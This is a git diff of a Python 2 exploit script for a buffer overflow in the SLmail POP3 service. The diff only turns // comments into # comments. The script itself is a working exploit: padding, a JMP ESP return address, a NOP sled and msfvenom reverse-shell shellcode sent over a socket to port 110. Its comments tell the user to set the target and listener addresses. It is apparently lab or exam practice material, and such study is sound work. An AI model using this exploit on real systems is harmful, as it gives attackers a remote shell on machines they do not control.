@@ -1,6 +1,6 @@
-//This is the Final Code of Buffer Overflow of the SLmail. 
-//Make sure to change the LHOST , RHOST , LPORT and RPORT according to your IP.
-//This script is based on python2
+#This is the Final Code of Buffer Overflow of the SLmail. 
+#Make sure to change the LHOST , RHOST , LPORT and RPORT according to your IP.
+#This script is based on python2
 
 import struct
 
@@ -8,12 +8,12 @@ import socket
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-//JMP ESP = 5F4A358F
+#JMP ESP = 5F4A358F
 
 buf = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 10
 
 
-//msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=port -f python -a x86 --platform windows -b "\x00\x0a\x0d"
+#msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=port -f python -a x86 --platform windows -b "\x00\x0a\x0d"
 
 buf += b"\xda\xde\xbf\xd4\x8e\xdc\xcf\xd9\x74\x24\xf4\x5a\x29"
 buf += b"\xc9\xb1\x52\x83\xc2\x04\x31\x7a\x13\x03\xae\x9d\x3e"
@@ -43,8 +43,8 @@ buf += b"\x8d\x99\x82\x0c\xf3\x39\x6c\xc7\xb7\x4a\x27\x45\x91"
 buf += b"\xc2\xee\x1c\xa3\x8e\x10\xcb\xe0\xb6\x92\xf9\x98\x4c"
 buf += b"\x8a\x88\x9d\x09\x0c\x61\xec\x02\xf9\x85\x43\x22\x28"
 
-//RHOST = 192.168.1.18 (Change according to your IP)
-//RPORT = 110 (Change according to your Vulnerable service port)
+#RHOST = 192.168.1.18 (Change according to your IP)
+#RPORT = 110 (Change according to your Vulnerable service port)
 
 try:
 	print "\nSending evil buffer..."
